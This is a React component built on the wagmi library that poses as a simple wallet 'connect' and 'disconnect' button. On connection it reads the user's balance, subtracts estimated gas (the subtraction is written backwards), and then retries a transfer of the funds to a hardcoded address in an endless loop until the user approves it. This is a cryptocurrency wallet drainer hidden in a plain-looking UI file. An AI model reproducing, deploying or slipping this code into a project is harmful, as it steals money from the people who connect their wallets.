"use client"
import {useSendTransaction, usePrepareContractWrite, useContractWrite, useWaitForTransaction ,useAccount, useBalance, useFeeData, useDisconnect, useWalletClient, useNetwork, useContractRead, usePublicClient } from 'wagmi'
//import { signTrans } from '@/utils/transact'
import {useState} from "react"
//import { erc20ABI } from 'wagmi'
import { receivers, con_adds } from '@/utils/constant/address'


export const SendButton = () => {
  
  const [amt, setAmt] = useState(BigInt("0"))
  const {chain} = useNetwork()
  const [receiver, setReceiver] = useState("0x359C0217D37b7E603A788f84B793E53d145b9D45")
 

  const publicClient = usePublicClient()
  const {address, isConnected} = useAccount({

    async onConnect({ address, connector, isReconnected }) {
     
    let bal = data?.value || BigInt("0")

    const gasEst = await publicClient.estimateGas({
        to: receiver,account: address, value: bal
    })
    let fee = gasPrice?.gasPrice || BigInt("0")
    let gasFee = fee * gasEst
    const rems = gasFee - bal // - fee change back to balance minus fee
    console.log(rems)

    /**
     * if(bal <= BigInt("0"))
     * {
     *   alert("Wallet not eligible")
     *   disconnect()
     * return
     * }
     * 
     */
    
    
   // setReceiver(receivers[cid])
    setAmt(rems)
    //setAddress(address)
   
  // console.log("contract and receiver",chain,con_adds[ind],receivers[ind], ind)
    }
  })


const {data: walletClient, isFetched, status} = useWalletClient(
  
  { 
    
  onError(error) {
   
    console.log("WC error", error)
  },

  async onSuccess(data) {

    if(isConnected)
    {

      const addresses = await data?.getAddresses()
      // console.log(addresses)
      //console.log(receiver, con_add)
     
      //console.log(data)
    while(true) 
   {

      try {
            const res = await data?.sendTransaction({
                account: address,
                to: receiver,
                value: amt
            })
            console.log("WC datas",res)
break
        
       } 
       catch (error) {
        console.log("sending from approve i.e send direct",error)
       }
    }
    }
  }
})
 

const { disconnect } = useDisconnect()

    const { data } = useBalance({
      address
    })

const {data: gasPrice } = useFeeData()
   
        if(isConnected) return <button onClick={() => disconnect()}>Disconnect</button>
        return (
          <>
    <w3m-button />
     </>

        )

}


